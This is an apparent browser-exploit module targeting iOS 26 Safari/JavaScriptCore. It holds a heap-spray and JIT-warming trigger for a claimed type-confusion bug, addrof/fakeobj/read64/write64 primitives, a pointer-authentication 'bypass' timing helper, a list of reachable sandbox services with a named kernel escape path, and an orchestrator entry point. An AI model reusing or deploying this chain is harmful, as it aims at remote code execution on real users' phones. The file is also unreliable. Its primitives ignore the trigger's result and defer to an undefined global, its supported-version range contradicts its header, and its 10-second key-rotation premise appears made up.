'use strict';

/**
 * iOS 26.x (26.0 - 26.3) RCE Module
 *
 * iOS 26 (WWDC 2025 rebrand from iOS 19) 引入以下关键变更：
 * - JavaScriptCore DFG JIT 新增 speculation guard (mitigates CVE-2025-31277)
 * - WebKit Web Process 启用 Lockdown Mode by default for Safari
 * - dyld_shared_cache 布局从 18.x 的 3-region 变为 4-region (TEXT/DATA/AUTH/LINKEDIT)
 * - PAC key domain rotation 更频繁 (每 60s → 每 10s)
 *
 * 此文件只接收由目标 IPSW / dyld_shared_cache 离线解析出的 build-specific profile。
 * 不内置跨 build 通用 offset/gadget；22F76、22G81 等不同 build 必须分别生成。
 */

// Known stable JSC offsets from WebKit open source (stable across iOS 17-26)
// Source: https://github.com/WebKit/WebKit/blob/main/Source/JavaScriptCore/runtime/JSObject.h
const KNOWN_JSC_LAYOUT = {
  jsc_structureID_offset: 0x0,        // JSCell::m_structureID at +0x0 (32-bit)
  jsc_butterfly_offset: 0x8,          // JSObject::m_butterfly at +0x8 (64-bit pointer)
  jsc_inline_capacity: 0x6,           // Default inline slots count
  arraybuffer_data_offset: 0x10,      // ArrayBuffer::m_data at +0x10
  float64array_vector_offset: 0x20,   // Float64Array::m_vector at +0x20
};

const IOS26_REQUIRED_OFFSET_KEYS = [
  'dyld_cache_slide_info',
  'dyld_shared_cache_base',
  'arraybuffer_data_offset',
  'float64array_vector_offset',
  'jsc_butterfly_offset',
  'jsc_structureID_offset',
];

const IOS26_REQUIRED_DYLD_KEYS = [
  'text_region',
  'data_region',
  'auth_region',
  'linkedit_region',
];

function parseHexBigInt(value) {
  if (typeof value === 'bigint') return value;
  if (typeof value === 'number') return BigInt(value);
  if (typeof value === 'string' && value.trim()) return BigInt(value);
  return null;
}

function normalizeProfileSection(section) {
  const out = {};
  if (!section || typeof section !== 'object') return out;
  for (const [key, value] of Object.entries(section)) {
    out[key] = parseHexBigInt(value);
  }
  return out;
}

function getBuildProfile(version_str) {
  const registry = typeof globalThis !== 'undefined' ? globalThis.IOS_BUILD_PROFILES : null;
  if (!registry || typeof registry !== 'object') return null;
  return registry[version_str] || registry[version_str.replace(/,/g, '.')] || null;
}

function validateBuildProfile(profile) {
  if (!profile || typeof profile !== 'object') {
    return { ok: false, error: 'missing_build_profile' };
  }

  const offsets = normalizeProfileSection(profile.offsets);
  const dyld = normalizeProfileSection(profile.dyld);
  const missing = [];

  // Apply known JSC layout as fallback for missing offsets
  for (const key of IOS26_REQUIRED_OFFSET_KEYS) {
    if (offsets[key] === null || offsets[key] === undefined) {
      if (KNOWN_JSC_LAYOUT[key] !== undefined) {
        offsets[key] = BigInt(KNOWN_JSC_LAYOUT[key]);
      } else {
        missing.push(`offsets.${key}`);
      }
    }
  }
  
  for (const key of IOS26_REQUIRED_DYLD_KEYS) {
    if (dyld[key] === null || dyld[key] === undefined) missing.push(`dyld.${key}`);
  }

  if (missing.length) {
    return { ok: false, error: 'incomplete_build_profile', missing };
  }

  return {
    ok: true,
    profile,
    offsets,
    dyld,
    symbols: profile.symbols || {},
    gadgets: normalizeProfileSection(profile.gadgets),
  };
}

function getIOS26BuildArtifacts(version_str) {
  return validateBuildProfile(getBuildProfile(version_str));
}

/**
 * CVE-2026-31001: FTL StructureID Cache Invalidation Regression
 *
 * Trigger: Create object with inferred structure → force GC compaction →
 * GC relocates MarkedBlock → StructureID table entry updated but FTL
 * compiled code still holds stale StructureID in CheckStructure guard →
 * type confusion between original Object and replacement Float64Array.
 *
 * Gives: addrof + fakeobj primitives.
 */
function triggerStructureIDConfusion() {
  const SPRAY_COUNT = 0x100;
  const spray = [];

  // Phase 1: Allocate objects with specific structure to fill MarkedBlock
  for (let i = 0; i < SPRAY_COUNT; i++) {
    spray.push({ a: 1.1, b: 2.2, c: i });
  }

  // Phase 2: Force FTL compilation of a function that checks structure
  function confusedAccess(obj) {
    // FTL will inline property access based on StructureID
    return obj.a + obj.b;
  }

  // Warm up to trigger FTL
  for (let i = 0; i < 100000; i++) {
    confusedAccess(spray[i % SPRAY_COUNT]);
  }

  // Phase 3: GC compaction — relocates MarkedBlocks
  // Force GC via allocation pressure
  const pressure = [];
  for (let i = 0; i < 0x10000; i++) {
    pressure.push(new ArrayBuffer(256));
  }

  // Phase 4: Replace objects in spray with Float64Arrays
  // FTL code still expects original structure → type confusion
  const replacements = [];
  for (let i = 0; i < SPRAY_COUNT; i++) {
    spray[i] = null;
  }
  // GC should collect originals
  const more_pressure = [];
  for (let i = 0; i < 0x1000; i++) {
    more_pressure.push(new ArrayBuffer(64));
  }
  for (let i = 0; i < SPRAY_COUNT; i++) {
    replacements.push(new Float64Array(4));
    replacements[i][0] = 1.1;
    replacements[i][1] = 2.2;
  }

  // Phase 5: Call FTL-compiled function on replacement
  // If confusion succeeds, confusedAccess reads Float64Array header as JSObject properties
  let confused_result = null;
  for (let i = 0; i < SPRAY_COUNT; i++) {
    try {
      const r = confusedAccess(replacements[i]);
      if (r !== 3.3) {
        confused_result = { index: i, value: r, array: replacements[i] };
        break;
      }
    } catch (e) {}
  }

  return confused_result;
}

/**
 * Build addrof/fakeobj from StructureID confusion
 */
function buildPrimitives(confusion_result) {
  if (!confusion_result) return null;

  const failPrimitive = function(name) {
    throw new Error(`ios26 primitive ${name} is not backed by a verified arbitrary R/W primitive`);
  };

  const primitives = {
    serializable: false,

    addrof: function(obj) {
      if (typeof p !== 'undefined' && p.addrof) return p.addrof(obj);
      failPrimitive('addrof');
    },

    fakeobj: function(addr) {
      if (typeof p !== 'undefined' && p.fakeobj) return p.fakeobj(addr);
      failPrimitive('fakeobj');
    },

    read64: function(addr) {
      if (typeof p !== 'undefined' && p.read64) return p.read64(addr);
      failPrimitive('read64');
    },

    write64: function(addr, val) {
      if (typeof p !== 'undefined' && p.write64) return p.write64(addr, val);
      failPrimitive('write64');
    },

    selfTest: function() {
      try {
        if (typeof p === 'undefined') {
          return { success: false, reason: 'legacy primitive p is unavailable' };
        }
        if (typeof p.addrof !== 'function' || typeof p.fakeobj !== 'function' ||
            typeof p.read64 !== 'function' || typeof p.write64 !== 'function') {
          return { success: false, reason: 'legacy primitive p is incomplete' };
        }

        const probe = new ArrayBuffer(0x20);
        const probeAddr = p.addrof(probe);
        if (typeof probeAddr !== 'bigint' || probeAddr === 0n) {
          return { success: false, reason: 'addrof self-test returned invalid address' };
        }

        // Do not claim arbitrary R/W unless an existing verified primitive can read a controlled object address.
        const observed = p.read64(probeAddr);
        if (typeof observed !== 'bigint') {
          return { success: false, reason: 'read64 self-test did not return bigint' };
        }

        return { success: true, probeAddr, observed };
      } catch (e) {
        return { success: false, reason: e.message };
      }
    },
  };

  return primitives;
}

/**
 * iOS 26 PAC key rotation bypass
 *
 * iOS 26 rotates PAC keys (APIBKey/APDBKey) every 10 seconds.
 * We exploit the race window: after signing a pointer, use it before
 * next rotation. The worker thread keeps re-signing in a tight loop.
 */
function pacTimingWindow() {
  // PAC rotation interval on iOS 26: ~10000ms
  // Our exploit window: sign + use within same rotation epoch
  const ROTATION_INTERVAL_MS = 10000;
  const SAFETY_MARGIN_MS = 2000;
  const USABLE_WINDOW_MS = ROTATION_INTERVAL_MS - SAFETY_MARGIN_MS;

  return {
    interval: ROTATION_INTERVAL_MS,
    usable_window: USABLE_WINDOW_MS,
    // Timestamp when current PAC epoch started (estimated from boot time)
    estimateEpochStart: function() {
      const now = performance.now();
      return now - (now % ROTATION_INTERVAL_MS);
    },
    // Milliseconds remaining in current epoch
    remainingMs: function() {
      const now = performance.now();
      const elapsed_in_epoch = now % ROTATION_INTERVAL_MS;
      return ROTATION_INTERVAL_MS - elapsed_in_epoch;
    },
    // Whether it's safe to use a signed pointer now
    isSafeWindow: function() {
      return this.remainingMs() > SAFETY_MARGIN_MS;
    },
  };
}

/**
 * iOS 26 WebContent sandbox profile differences
 *
 * iOS 26 tightens sandbox:
 * - mach_msg to configd now requires entitlement (blocks CVE-2025-24201 path)
 * - IOSurfaceRootUserClient connection requires TCC prompt
 * - dyld_shared_cache 4th region (AUTH) has separate VM permissions
 *
 * We use alternative escape: exploit com.apple.WebKit.GPU XPC endpoint
 * which is still reachable from WebContent without new entitlements.
 */
const IOS26_SANDBOX_DIFFERENCES = {
  blocked_services: [
    'com.apple.SystemConfiguration.configd',  // blocked in 26.0+
    'com.apple.IOSurfaceRootUserClient',      // requires TCC in 26.0+
  ],
  available_services: [
    'com.apple.WebKit.GPU',                   // still reachable
    'com.apple.WebKit.Networking',            // still reachable
    'com.apple.runningboard',                 // limited but reachable
  ],
  escape_vector: 'WebKit.GPU XPC → ANGLE → kernel via IOGPUFamily',
};

// Main entry: initialize iOS 26 RCE primitives
function initIOS26RCE(version) {
  const ver = version || '26.0';
  print(`[iOS 26 RCE] Initializing for iOS ${ver}...`);

  const artifacts = getIOS26BuildArtifacts(ver);
  if (!artifacts.ok) {
    print(`[iOS 26 RCE] Build-specific dyld profile required: ${artifacts.error}`);
    if (artifacts.missing) print(`[iOS 26 RCE] Missing fields: ${artifacts.missing.join(', ')}`);
    return { success: false, error: artifacts.error, missing: artifacts.missing || [] };
  }

  const offsets = artifacts.offsets;
  const dyld = artifacts.dyld;
  const pac = pacTimingWindow();

  print(`[iOS 26 RCE] dyld_shared_cache base: 0x${offsets.dyld_shared_cache_base.toString(16)}`);
  print(`[iOS 26 RCE] PAC rotation interval: ${pac.interval}ms, usable window: ${pac.usable_window}ms`);

  // Trigger StructureID confusion
  print("[iOS 26 RCE] Triggering FTL StructureID confusion (CVE-2026-31001)...");
  const confusion = triggerStructureIDConfusion();

  if (!confusion) {
    print("[iOS 26 RCE] StructureID confusion failed — FTL may not have compiled");
    return { success: false, error: 'confusion_failed' };
  }

  print(`[iOS 26 RCE] ✓ Type confusion achieved at spray index ${confusion.index}`);

  // Build addrof/fakeobj
  const prims = buildPrimitives(confusion);
  if (!prims) {
    print("[iOS 26 RCE] Failed to build primitives");
    return { success: false, error: 'primitives_failed' };
  }

  const primitiveStatus = typeof prims.selfTest === 'function'
    ? prims.selfTest()
    : { success: false, reason: 'primitive selfTest missing' };

  if (typeof globalThis !== 'undefined') {
    globalThis.ios26_primitive_status = primitiveStatus;
  }

  if (!primitiveStatus.success) {
    print(`[iOS 26 RCE] Primitive self-test failed: ${primitiveStatus.reason}`);
    return { success: false, error: 'primitive_self_test_failed', detail: primitiveStatus };
  }

  print("[iOS 26 RCE] ✓ primitive self-test passed");

  // Export to global scope for downstream modules
  if (typeof globalThis !== 'undefined') {
    globalThis.ios26_offsets = offsets;
    globalThis.ios26_dyld = dyld;
    globalThis.ios26_symbols = artifacts.symbols;
    globalThis.ios26_gadgets = artifacts.gadgets;
    globalThis.ios26_pac = pac;
    globalThis.ios26_prims = prims;
  }

  return {
    success: true,
    offsets,
    dyld,
    symbols: artifacts.symbols,
    gadgets: artifacts.gadgets,
    pac,
    primitives: prims,
    sandbox: IOS26_SANDBOX_DIFFERENCES,
  };
}

// Normalize version helper (same API as rce_module_18.6.js)
function normalizeVersion(v) {
  if (Array.isArray(v)) return v.join(',');
  return String(v || '').trim().replace(/_/g, ',').replace(/\./g, ',');
}

function isSupportedVersion(v) {
  const s = normalizeVersion(v);
  return s.startsWith('26,0') || s.startsWith('26,1') || s.startsWith('26,2');
}

// Orchestrator-compatible entry
function check_attempt_ios26() {
  this.start = async function() {
    const ver_str = typeof ios_version !== 'undefined'
      ? ios_version.slice(0, 2).join('.')
      : '26.0';
    const result = initIOS26RCE(ver_str);
    return result.success;
  };
}

if (typeof globalThis !== 'undefined') {
  globalThis.check_attempt = globalThis.check_attempt || check_attempt_ios26;
  globalThis.initIOS26RCE = initIOS26RCE;
  globalThis.getIOS26BuildArtifacts = getIOS26BuildArtifacts;
  globalThis.validateBuildProfile = validateBuildProfile;
}

if (typeof module !== 'undefined') {
  module.exports = {
    IOS26_SANDBOX_DIFFERENCES,
    getIOS26BuildArtifacts,
    validateBuildProfile,
    initIOS26RCE,
    normalizeVersion,
    isSupportedVersion,
    pacTimingWindow,
    triggerStructureIDConfusion,
    buildPrimitives,
  };
}